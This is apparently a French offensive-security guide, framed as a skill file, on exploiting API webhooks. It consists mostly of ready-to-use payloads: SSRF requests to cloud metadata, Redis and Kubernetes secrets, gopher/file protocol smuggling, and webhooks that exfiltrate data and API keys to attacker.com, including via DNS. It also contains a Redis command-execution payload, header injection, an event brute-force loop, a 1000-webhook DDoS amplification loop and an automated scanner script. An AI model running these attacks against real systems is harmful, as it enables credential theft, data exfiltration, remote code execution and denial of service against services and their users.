---
name: api-webhook-exfiltration
description: Guide complet d'exploitation des webhooks API — SSRF inbound via webhooks, exfiltration out-of-band, callback servers, blind SSRF, DNS exfiltration, webhook smuggling, et détournement de notification
category: cybersecurite
---

# API Webhook & OOB Exfiltration — Guide Avancé

## Introduction

Les webhooks sont des mécanismes où l'API envoie des requêtes HTTP vers une URL configurée pour notifier des événements. Cette fonctionnalité est un vecteur SSRF massif et un pipeline d'exfiltration idéal.

## 1. SSRF via Webhook URL

### 1.1 URL Injection Basique

```bash
# Webhook vers services internes
POST /api/v1/webhooks
{
  "url": "http://127.0.0.1:8080/admin",
  "event": "order.created"
}

# Webhook vers cloud metadata
POST /api/v1/webhooks
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "event": "user.created"
}

# Webhook vers base de données
POST /api/v1/webhooks
{
  "url": "http://10.0.0.1:5432/",
  "event": "test"
}

# Webhook vers Redis
POST /api/v1/webhooks
{
  "url": "http://10.0.0.1:6379/",
  "event": "order.created"
}
# → Redis peut être exploité si non auth
```

### 1.2 Protocol Smuggling

```bash
# Gopher protocol
POST /api/v1/webhooks
{
  "url": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0akey1%0d%0a$5%0d%0avalue%0d%0a",
  "event": "test"
}

# Dict protocol
POST /api/v1/webhooks
{
  "url": "dict://127.0.0.1:6379/info",
  "event": "test"
}

# File protocol
POST /api/v1/webhooks
{
  "url": "file:///etc/passwd",
  "event": "test"
}

# FTP protocol
POST /api/v1/webhooks
{
  "url": "ftp://attacker.com:21/test",
  "event": "test"
}

# SMB protocol (Windows)
POST /api/v1/webhooks
{
  "url": "file://attacker.com/share/test",
  "event": "test"
}
```

### 1.3 URL Bypass Techniques

```bash
# DNS rebinding
POST /api/v1/webhooks
{
  "url": "http://rebind-attacker.com:8080/admin",
  "event": "order.created"
}

# URL encoding bypass
POST /api/v1/webhooks
{
  "url": "http://127.0.0.1%00%40evil.com/",
  "event": "test"
}

# IPv6 bypass
POST /api/v1/webhooks
{
  "url": "http://[::1]:8080/admin",
  "event": "test"
}

# Decimal IP
POST /api/v1/webhooks
{
  "url": "http://2130706433:8080/",  # = 127.0.0.1
  "event": "test"
}

# Short URL redirect
POST /api/v1/webhooks
{
  "url": "http://shorturl.at/xyz123",  # redirect → internal
  "event": "test"
}
```

## 2. Blind OOB Exfiltration

### 2.1 Data Exfiltration via Webhook Body

```bash
# Configurer un webhook qui reçoit des données sensibles
POST /api/v1/webhooks
{
  "url": "http://attacker.com/exfil",
  "event": "*"  # tous les événements
}

# Quand l'événement se déclenche, le body contient les données
# POST /webhook → body: {"order": {"id": 123, "total": 500, "userId": 456}}
# L'attaquant reçoit toutes les données en temps réel
```

### 2.2 URL Parameter Exfiltration

```bash
# Si le webhook URL peut contenir des paramètres dynamiques
POST /api/v1/webhooks
{
  "url": "http://attacker.com/{event.type}?id={order.id}&amount={order.total}",
  "event": "order.created"
}

# Template injection dans l'URL
POST /api/v1/webhooks
{
  "url": "http://attacker.com/{{user.email}}?key={{api.key}}",
  "event": "user.created"
}
```

### 2.3 Header Exfiltration

```bash
# Exfiltrer via les headers (si le serveur les loggue)
POST /api/v1/webhooks
{
  "url": "http://attacker.com/",
  "event": "order.created",
  "headers": {
    "X-Leak-Email": "{{user.email}}",
    "X-Leak-Token": "{{user.token}}"
  }
}
```

## 3. Callback Server Setup

```bash
# Interact.sh — callback OOB
curl "https://oob.interact.sh/generate"
→ {"token":"abc123", "url":"http://abc123.oob.interact.sh"}

# Utiliser l'URL générée dans le webhook
POST /api/v1/webhooks
{
  "url": "http://abc123.oob.interact.sh/exfil",
  "event": "order.created"
}

# Voir les callbacks
curl "https://oob.interact.sh/abc123/log"
→ [{"time":"...", "method":"POST", "body":"..."}]

# Burp Collaborator (local)
# Activer dans Burp → Collaborator → Copier l'URL
```

### 3.1 Serveur de Callback Local

```bash
# Simple callback server avec Python
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class CallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[GET] {self.path}', file=sys.stderr)
        print(f'[HEADERS] {self.headers}', file=sys.stderr)
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('content-length', 0))
        body = self.rfile.read(length)
        print(f'[POST] {self.path}', file=sys.stderr)
        print(f'[BODY] {body[:2000]}', file=sys.stderr)
        print(f'[HEADERS] {self.headers}', file=sys.stderr)
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8888), CallbackHandler).serve_forever()
"

# Avec ngrok pour exposition publique
ngrok http 8888
```

### 3.2 DNS Exfiltration

```bash
# Exfiltrer via DNS (pas de HTTP, juste DNS query)
# Configurer un serveur DNS qui loggue les requêtes
POST /api/v1/webhooks
{
  "url": "http://$(cat /etc/hostname).exfil.attacker.com/test",
  "event": "order.created"
}
# DNS query: server123.exfil.attacker.com → loggué

# Exfiltration de données via DNS
# Si le webhook URL supporte le DNS
POST /api/v1/webhooks
{
  "url": "http://$(echo -n $API_KEY | base64).exfil.attacker.com/",
  "event": "test"
}
```

## 4. Webhook Event Hijacking

### 4.1 Subscribe to All Events

```bash
# S'abonner à tous les événements possibles
POST /api/v1/webhooks
{
  "url": "http://attacker.com/exfil",
  "event": "*"
}

# S'abonner à des événements sensibles
POST /api/v1/webhooks
{
  "url": "http://attacker.com/exfil",
  "event": "password.reset"
}

POST /api/v1/webhooks
{
  "url": "http://attacker.com/exfil",
  "event": "payment.completed"
}

POST /api/v1/webhooks
{
  "url": "http://attacker.com/exfil",
  "event": "user.email.changed"
}

# Découvrir les événements disponibles
POST /api/v1/webhooks/events
# → ["order.created", "order.updated", "user.created", "payment.completed", ...]
```

### 4.2 Webhook Event Bruteforce

```bash
# Bruteforcer les noms d'événements
for event in order user payment product customer \
             account subscription invoice transaction \
             transfer refund chargeback dispute \
             auth login logout register verify; do
  for action in created updated deleted completed \
                failed cancelled pending approved; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://api.target.com/api/v1/webhooks \
      -d "{\"url\":\"http://attacker.com/test\",\"event\":\"$event.$action\"}")
    [ "$resp" != "400" ] && echo "[$resp] $event.$action"
  done
done
```

## 5. Webhook Authentication Bypass

### 5.1 Secret Bypass

```bash
# Webhook avec secret optionnel
POST /api/v1/webhooks
{
  "url": "http://attacker.com/exfil",
  "event": "order.created",
  "secret": ""  # secret vide
}

# Webhook sans secret du tout
POST /api/v1/webhooks
{
  "url": "http://attacker.com/exfil",
  "event": "order.created"
}
# → Pas de vérification HMAC sur les notifications
```

### 5.2 Webhook URL Modification

```bash
# Modifier l'URL d'un webhook existant
PUT /api/v1/webhooks/123
{
  "url": "http://attacker.com/exfil",
  "active": true
}

# Lire les webhooks existants
GET /api/v1/webhooks
→ [{"id": 123, "url": "http://target.com/legit", "event": "order.created"}]

# Voler un webhook en modifiant sa destination
```

## 6. Webhook Smuggling

### 6.1 HTTP Request Smuggling via Webhook

```bash
# Si le webhook envoie une requête HTTP, on peut smuggler
# via les headers injectés
POST /api/v1/webhooks
{
  "url": "http://127.0.0.1:8080/",
  "event": "order.created",
  "headers": {
    "Foo": "bar\r\nX-Injected: true\r\nX-Internal-Command: delete-all"
  }
}
```

### 6.2 Response Smuggling

```bash
# Si le webhook attend une réponse, on peut l'injecter
# Configurer un serveur qui répond avec des headers injectés
# pour manipuler le parsage HTTP du serveur
```

## 7. Webhook-SSRF to RCE

### 7.1 Redis SSRF via Webhook

```bash
# Si le webhook peut atteindre Redis (6379)
# Injecter une clé Redis avec une commande
POST /api/v1/webhooks
{
  "url": "http://127.0.0.1:6379/",
  "event": "test"
}

# Via gopher pour des commandes Redis complexes
POST /api/v1/webhooks
{
  "url": "gopher://127.0.0.1:6379/_EVAL%20%22os.execute('id')%22%200",
  "event": "test"
}
```

### 7.2 Kubernetes API SSRF

```bash
# Accès à l'API Kubernetes interne
POST /api/v1/webhooks
{
  "url": "https://kubernetes.default.svc/api/v1/secrets",
  "event": "order.created"
}

# Kubelet API
POST /api/v1/webhooks
{
  "url": "http://10.0.0.1:10250/run/admin/id",
  "event": "test"
}
```

## 8. Mass Webhook Creation (Amplification)

```bash
# Créer des milliers de webhooks vers la même cible (DDoS)
for i in $(seq 1 1000); do
  curl -X POST https://api.target.com/api/v1/webhooks \
    -d "{\"url\":\"http://victim.com/webhook$i\",\"event\":\"order.created\"}"
done
# Quand un événement se déclenche, 1000 requêtes sont envoyées à victim.com
```

## Script Automatisé

```python
#!/usr/bin/env python3
"""Webhook SSRF & exfiltration scanner."""
import requests
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

BASE = "https://api.target.com"

# Endpoints internes à tester
INTERNAL_TARGETS = [
    "http://127.0.0.1:8080/admin",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:5000/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://10.0.0.1:8000/",
    "http://kubernetes.default.svc/"
]

def test_ssrf_webhook():
    """Teste SSRF via webhook URL."""
    for target in INTERNAL_TARGETS:
        try:
            r = requests.post(BASE + "/api/v1/webhooks", json={
                "url": target,
                "event": "test"
            }, timeout=5)
            if r.status_code in [200, 201]:
                print(f"[SSRF] Webhook créé vers {target}")
                # Tester le déclenchement
                r2 = requests.post(BASE + "/api/v1/orders", json={
                    "productId": 1, "quantity": 1
                })
                print(f"  → Déclenché: POST /api/v1/orders → {r2.status_code}")
        except Exception as e:
            print(f"[ERR] {target}: {e}")

def test_protocol_smuggling():
    """Teste les protocoles alternatifs."""
    for protocol in ["file:///etc/passwd", "dict://127.0.0.1:6379/info"]:
        r = requests.post(BASE + "/api/v1/webhooks", json={
            "url": protocol,
            "event": "test"
        })
        print(f"[PROTO] {protocol}: {r.status_code}")

def discover_events():
    """Découvre les événements webhook disponibles."""
    events = ["order.*", "user.*", "payment.*", "*.created", "*.updated"]
    candidates = set()
    for evt in events:
        r = requests.post(BASE + "/api/v1/webhooks", json={
            "url": "http://attacker.com/test",
            "event": evt
        })
        if r.status_code != 400:
            candidates.add(evt)
    print(f"[EVENTS] Valides: {candidates}")

if __name__ == "__main__":
    test_ssrf_webhook()
    test_protocol_smuggling()
    discover_events()
```

## Checklist

- [ ] Webhook URL → localhost (127.0.0.1)
- [ ] Webhook URL → cloud metadata (AWS/GCP/Azure)
- [ ] Webhook URL → services internes (Redis, k8s, DB)
- [ ] Protocol smuggling (gopher, dict, file, ftp)
- [ ] URL bypass (encodage, IPv6, decimal IP)
- [ ] DNS rebinding
- [ ] Blind OOB exfiltration (Interact.sh, Collaborator)
- [ ] Data leak via webhook body
- [ ] Template injection dans URL webhook
- [ ] Subscribe to all events (*)
- [ ] Subscribe to sensitive events
- [ ] Event bruteforce
- [ ] Webhook without secret
- [ ] Webhook URL modification (PUT)
- [ ] Webhook smuggling (header injection)
- [ ] Redis/K8s SSRF via webhook
- [ ] Mass webhook creation (amplification/DDoS)
- [ ] Callback server setup

## Ressources

- **HackTricks SSRF** : https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
- **Interact.sh** : https://app.interactsh.com/
- **Webhook Security** : https://www.nginx.com/blog/webhook-security-best-practices/
- **PortSwigger SSRF** : https://portswigger.net/web-security/ssrf